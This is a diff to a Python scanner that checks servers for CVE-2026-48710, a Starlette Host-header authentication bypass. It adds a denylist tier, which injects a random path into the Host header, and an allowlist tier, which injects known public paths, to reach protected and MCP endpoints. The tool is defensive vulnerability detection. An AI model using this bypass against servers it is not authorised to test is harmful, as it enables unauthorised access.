@@ -28,10 +28,18 @@
 # SOFTWARE.
 """CVE-2026-48710 — Starlette Host-Header Authentication Bypass Scanner.
 
-Three-step detection:
-  1. Discover unauthenticated (allowlisted) paths
-  2. Discover protected endpoints (MCP or user-specified)
-  3. Inject allowlisted paths into the Host header to bypass auth
+Two-tier detection:
+  Tier 1 — Denylist bypass: injects a random nonsense path into the Host
+           header.  Detects fail-open middleware that only protects specific
+           paths and lets everything else through.
+  Tier 2 — Allowlist bypass: discovers known unauthenticated paths and
+           injects them into the Host header.  Detects fail-closed middleware
+           that only skips auth for specific allowlisted paths.
+
+Scan flow:
+  1. Discover protected endpoints (MCP or user-specified)
+  2. Tier 1: try random-path bypass against protected endpoints
+  3. If Tier 1 fails: discover allowlisted paths, then Tier 2 bypass
 
 Two bypass strategies:
   prefix:        Host: target.example.com/health
@@ -40,7 +48,7 @@ Two bypass strategies:
 Usage:
     python scan_cve_2026_48710.py https://target.example.com
     python scan_cve_2026_48710.py http://target:8080 --mode generic \\
-        --unauth /health --protected /admin/api
+        --protected /admin/api
     python scan_cve_2026_48710.py https://target.example.com --json
 """
 
@@ -78,6 +86,12 @@ MCP_INIT = json.dumps(
     }
 )
 
+# Fixed nonsense path for Tier 1 denylist detection.  Denylist middleware
+# only protects specific paths and lets unknown paths through, so this will
+# pass through to the router while the Host header injection redirects the
+# middleware's path check to this harmless string.
+RANDOM_BYPASS_PATH = "/zQk7Xm9vP3nJ"
+
 DEFAULT_MCP_PATHS = [
     "/mcp",
     "/mcp/",
@@ -98,7 +112,7 @@ DEFAULT_MCP_PATHS = [
     "/server/mcp",
 ]
 
-DEFAULT_UNAUTH_PATHS = [
+DEFAULT_MCP_UNAUTH_PATHS = [
     "/.well-known/oauth-protected-resource",
     "/.well-known/oauth-authorization-server",
     "/.well-known/openid-configuration",
@@ -120,6 +134,20 @@ DEFAULT_UNAUTH_PATHS = [
     "/robots.txt",
     "/version",
     "/info",
+]
+
+DEFAULT_GENERIC_UNAUTH_PATHS = [
+    "/docs",
+    "/openapi.json",
+    "/health",
+    "/healthz",
+    "/metrics",
+    "/redoc",
+    "/version",
+    "/info",
+    "/ping",
+    "/status",
+    "/favicon.ico",
 ]
 
 # ---------------------------------------------------------------------------
@@ -223,27 +251,39 @@ def looks_like_mcp(body: str) -> bool:
 # ---------------------------------------------------------------------------
 
 
-def step1_find_unauth(
-    host: str, port: int, use_tls: bool, paths: list[str], timeout: int
-) -> list[tuple[str, int]]:
-    heading("Step 1: Discovering unauthenticated paths")
-    found: list[tuple[str, int]] = []
-    for path in paths:
-        status, _ = http_request(host, port, use_tls, "GET", path, host, timeout=timeout)
-        if status is not None and 200 <= status < 400:
-            good(f"{path} -> {status}")
-            found.append((path, status))
-    if found:
-        info(f"Found {len(found)} reachable unauthenticated path(s)")
-    else:
-        warn("No unauthenticated paths found")
-    return found
-
-
-def step2_find_protected_mcp(
+def discover_allowlisted(
     host: str, port: int, use_tls: bool, paths: list[str], timeout: int
 ) -> tuple[list[tuple[str, int]], list[tuple[str, int]]]:
-    heading("Step 2: Discovering protected MCP endpoints")
+    """Probe paths and return (reachable, candidates).
+
+    reachable:  2xx/3xx — reported as allowlisted in output
+    candidates: any response including 404 — used for bypass attempts
+                because the middleware may still match the path even
+                if the router returns 404
+    """
+    heading("Discovering unauthenticated paths")
+    reachable: list[tuple[str, int]] = []
+    candidates: list[tuple[str, int]] = []
+    for path in paths:
+        status, _ = http_request(host, port, use_tls, "GET", path, host, timeout=timeout)
+        if status is not None:
+            candidates.append((path, status))
+            if 200 <= status < 400:
+                good(f"{path} -> {status}")
+                reachable.append((path, status))
+    if reachable:
+        info(f"Found {len(reachable)} reachable unauthenticated path(s)")
+    else:
+        warn("No unauthenticated paths found")
+    if len(candidates) > len(reachable):
+        info(f"{len(candidates) - len(reachable)} additional responding path(s) (4xx/5xx) will be used as candidates")
+    return reachable, candidates
+
+
+def discover_protected_mcp(
+    host: str, port: int, use_tls: bool, paths: list[str], timeout: int
+) -> tuple[list[tuple[str, int]], list[tuple[str, int]]]:
+    heading("Discovering protected MCP endpoints")
     protected: list[tuple[str, int]] = []
     open_eps: list[tuple[str, int]] = []
     for path in paths:
@@ -266,10 +306,10 @@ def step2_find_protected_mcp(
     return protected, open_eps
 
 
-def step2_verify_protected(
+def verify_protected(
     host: str, port: int, use_tls: bool, paths: list[str], timeout: int
 ) -> list[tuple[str, int]]:
-    heading("Step 2: Verifying protected endpoints")
+    heading("Verifying protected endpoints")
     protected: list[tuple[str, int]] = []
     for path in paths:
         status, _ = http_request(host, port, use_tls, "GET", path, host, timeout=timeout)
@@ -283,17 +323,16 @@ def step2_verify_protected(
     return protected
 
 
-def step3_try_bypass(
+def try_bypass(
     host: str,
     port: int,
     use_tls: bool,
     unauth: list[tuple[str, int]],
     protected: list[tuple[str, int]],
     mode: str,
+    tier: int,
     timeout: int,
 ) -> list[dict]:
-    heading("Step 3: Testing host-header bypass")
-
     strategies = [
         ("prefix", lambda h, p: f"{h}{p}"),
         ("query-absorb", lambda h, p: f"{h}{p}?x="),
@@ -334,6 +373,7 @@ def step3_try_bypass(
                                 "target_path": target_path,
                                 "unauth_path": unauth_path,
                                 "strategy": strat_name,
+                                "tier": tier,
                                 "host_header": injected,
                                 "status": status,
                                 "baseline_status": baseline,
@@ -354,7 +394,7 @@ def scan(
     mcp_paths: list[str],
     protected_paths: list[str],
     timeout: int,
-) -> tuple[str, list[dict]]:
+) -> tuple[str, list[dict], int]:
     parsed = urlparse(target)
     if parsed.scheme not in ("http", "https"):
         fail(f"Unsupported scheme: {parsed.scheme}")
@@ -368,31 +408,43 @@ def scan(
     info(f"Mode:   {mode}")
     info(f"Host:   {host}:{port} ({'TLS' if use_tls else 'plain HTTP'})")
 
-    # Step 1
-    unauth = step1_find_unauth(host, port, use_tls, unauth_paths, timeout)
-    if not unauth:
-        return "no-allowlist-candidate", []
-
-    # Step 2
+    # --- Discover protected endpoints first ---
     open_eps: list[tuple[str, int]] = []
     if mode == "mcp":
-        protected, open_eps = step2_find_protected_mcp(host, port, use_tls, mcp_paths, timeout)
+        protected, open_eps = discover_protected_mcp(host, port, use_tls, mcp_paths, timeout)
     else:
-        protected = step2_verify_protected(host, port, use_tls, protected_paths, timeout)
+        protected = verify_protected(host, port, use_tls, protected_paths, timeout)
 
     if not protected and not open_eps:
-        return ("no-mcp-endpoint" if mode == "mcp" else "no-protected-endpoint"), []
+        return ("no-mcp-endpoint" if mode == "mcp" else "no-protected-endpoint"), [], 0
     if not protected and open_eps:
-        return "mcp-open-without-auth", []
+        return "mcp-open-without-auth", [], 0
 
-    # Step 3
-    bypasses = step3_try_bypass(host, port, use_tls, unauth, protected, mode, timeout)
-    return ("vulnerable" if bypasses else "not-vulnerable"), bypasses
+    # --- Tier 1: random path bypass (denylist detection) ---
+    heading("Testing denylist bypass (Tier 1)")
+    random_candidate = [(RANDOM_BYPASS_PATH, 0)]
+    tier1 = try_bypass(host, port, use_tls, random_candidate, protected, mode, 1, timeout)
+    if tier1:
+        return "vulnerable", tier1, 1
+
+    # --- Tier 2: known allowlist paths ---
+    reachable, candidates = discover_allowlisted(host, port, use_tls, unauth_paths, timeout)
+    if not candidates:
+        return "not-vulnerable", [], 0
+
+    heading("Testing allowlist bypass (Tier 2)")
+    tier2 = try_bypass(host, port, use_tls, candidates, protected, mode, 2, timeout)
+    if tier2:
+        return "vulnerable", tier2, 2
+
+    return "not-vulnerable", [], 0
 
 
 # ---------------------------------------------------------------------------
 # CLI
 # ---------------------------------------------------------------------------
+
+TIER_LABELS = {1: "denylist bypass", 2: "allowlist bypass"}
 
 
 def main() -> None:
@@ -405,6 +457,8 @@ def main() -> None:
 examples:
   %(prog)s https://target.example.com
   %(prog)s http://localhost:8080 --mode mcp
+  %(prog)s https://target.example.com --mode generic \\
+      --protected /admin/api
   %(prog)s https://target.example.com --mode generic \\
       --unauth /health --protected /admin/api
   %(prog)s https://target.example.com --json
@@ -446,25 +500,39 @@ X41 D-Sec GmbH — https://x41-dsec.de""",
         fail("Generic mode requires at least one --protected path")
         sys.exit(1)
 
-    verdict, bypasses = scan(
+    if args.unauth:
+        unauth_paths = args.unauth
+    elif args.mode == "generic":
+        unauth_paths = DEFAULT_GENERIC_UNAUTH_PATHS
+    else:
+        unauth_paths = DEFAULT_MCP_UNAUTH_PATHS
+
+    verdict, bypasses, bypass_tier = scan(
         target=args.target,
         mode=args.mode,
-        unauth_paths=args.unauth or DEFAULT_UNAUTH_PATHS,
+        unauth_paths=unauth_paths,
         mcp_paths=args.mcp_path or DEFAULT_MCP_PATHS,
         protected_paths=args.protected,
         timeout=args.timeout,
     )
 
     if args.json:
-        json.dump(
-            {"target": args.target, "mode": args.mode, "verdict": verdict, "bypasses": bypasses},
-            sys.stdout, indent=2,
-        )
+        result: dict = {
+            "target": args.target,
+            "mode": args.mode,
+            "verdict": verdict,
+            "bypasses": bypasses,
+        }
+        if bypass_tier:
+            result["bypass_tier"] = bypass_tier
+        json.dump(result, sys.stdout, indent=2)
         print()
     else:
         print(f"\n{'=' * 55}", file=sys.stderr)
         if verdict == "vulnerable":
-            vuln(f"VULNERABLE — {len(bypasses)} bypass(es) confirmed")
+            tier_label = TIER_LABELS.get(bypass_tier, "")
+            tier_info = f" (Tier {bypass_tier}: {tier_label})" if tier_label else ""
+            vuln(f"VULNERABLE — {len(bypasses)} bypass(es) confirmed{tier_info}")
         elif verdict == "not-vulnerable":
             good("NOT VULNERABLE — no bypasses found")
         elif verdict == "mcp-open-without-auth":
